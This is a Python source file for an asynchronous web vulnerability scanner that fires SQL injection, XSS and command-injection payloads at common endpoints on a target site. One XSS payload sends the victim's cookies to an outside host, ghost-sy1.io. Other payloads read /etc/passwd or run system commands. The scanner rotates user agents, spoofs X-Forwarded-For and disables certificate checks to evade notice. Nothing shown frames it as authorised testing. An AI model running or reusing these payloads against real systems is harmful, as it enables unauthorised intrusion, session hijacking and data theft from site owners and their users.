import asyncio
import aiohttp
import random
class AdvancedWebScanner:
    def __init__(self, target_url):
        self.target_url = target_url if target_url.startswith("http") else f"https://{target_url}"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Android) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        ]
        self.payloads = {
            "sqli": ["' OR '1'='1", "UNION SELECT null,version()--", "AND EXTRACTVALUE(1,CONCAT(0x7e,version()))"],
            "xss": ["<script>fetch('http://ghost-sy1.io/'+btoa(document.cookie))</script>", "\"><svg/onload=alert(1)>"],
            "rce": ["; cat /etc/passwd", "| uname -a", "`id`"]
        }
    async def test_vulnerability(self, session, endpoint, vuln_type, payload):
        headers = {"User-Agent": random.choice(self.user_agents), "X-Forwarded-For": "127.0.0.1"}
        target = f"{self.target_url}{endpoint}?test={payload}"
        try:
            async with session.get(target, headers=headers, timeout=8, ssl=False) as response:
                text = await response.text()
                if response.status == 200 and (any(err in text.lower() for err in ["sql syntax", "root:", "uid="]) or payload in text):
                    return {"status": "VULNERABLE", "type": vuln_type, "payload": payload, "endpoint": endpoint}
        except Exception:
            pass
        return None
    async def scan(self):
        vulnerabilities = []
        endpoints = ["/index.php", "/login.php", "/api/v1/search", "/profile.php", "/dashboard"]
        async with aiohttp.ClientSession() as session:
            tasks = []
            for ep in endpoints:
                for v_type, plist in self.payloads.items():
                    for p in plist:
                        tasks.append(self.test_vulnerability(session, ep, v_type, p))
            results = await asyncio.gather(*tasks)
            for r in results:
                if r: vulnerabilities.append(r)
        return vulnerabilities
